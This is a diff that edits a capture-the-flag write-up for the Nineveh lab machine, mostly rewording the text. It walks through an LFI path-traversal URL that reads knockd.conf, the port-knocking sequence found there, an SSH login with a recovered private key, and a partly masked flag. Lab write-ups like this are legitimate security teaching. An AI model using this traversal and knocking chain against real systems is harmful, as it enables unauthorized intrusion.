@@ -535,17 +535,17 @@ We're in as `www-data`.
 
 <br />
 
-# Gain Initial Access - Via Knockd
+# Gaining Access - via knockd 
 
 <br />
 
-Another way to gain access to the system is using the LFI to list `knocd.conf` file and see the sequence of `port-knocking` that we need to follow to open temporarily the SSH port of the victime machine.
+Another way to access the system is by using the LFI vulnerability to read the `knockd.conf`, which reveals the port-knocking sequence required to temporarily open the SSH port.
 
-Before perform this, we need to understand some key concepts:
+Before proceeding, let's review some key concepts:
 
 - `Port-knocking`: Is a security technique used to protect network services by requiring a specific sequence of connection attempts to closed ports before allowing access to a target service.
 
-- `knockd.conf`: The file `knockd.conf` is a configuration file used by the `knockd` daemon, which is a port-knocking server. It defines the sequences of network packets (or "knocks") that knockd will listen for and the actions to take when a valid sequence is received.
+- `knockd.conf`: This is the configuration file for the `knockd` daemon. It defines the sequence of ports a client must "knock" on and the corresponding action (e.g., opening SSH) that should be executed when the correct sequence is detected.
 
 Once we understood that, let's list the `knockd.conf` taking advantage of the LFI:
 
@@ -558,7 +558,7 @@ http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/knockd.c
 
 <br />
 
-We have the sequence to open SSH port: `571, 290, 911`.
+From the output, we identify the required port-knocking sequence to open the SSH port: **571, 290, 911**.
 
 With this information, we will use `knock` to open the port 22 of the victim machine from our Linux system:
 
@@ -572,6 +572,8 @@ knock 10.10.10.43 571 290 911
 
 And now we can authenticate as the user `amrois` using the `id_rsa` that we get from the `secure_notes` path image:
 
+⚠️ Make sure to set the correct permissions on the private key using `chmod 600 id_rsa` before connecting.
+
 <br />
 
 ```bash
@@ -581,6 +583,19 @@ You have mail.
 Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
 amrois@nineveh:~$ whoami
 amrois
+```
+
+We now have a shell as the `amrois` user:
+
+<br />
+
+And we can get the `user.txt` flag:
+
+<br />
+
+```bash
+amrois@nineveh:~$ cat user.txt
+67bbc6cddf93b05eee64d8a315xxxxxx
 ```
 
 <br />
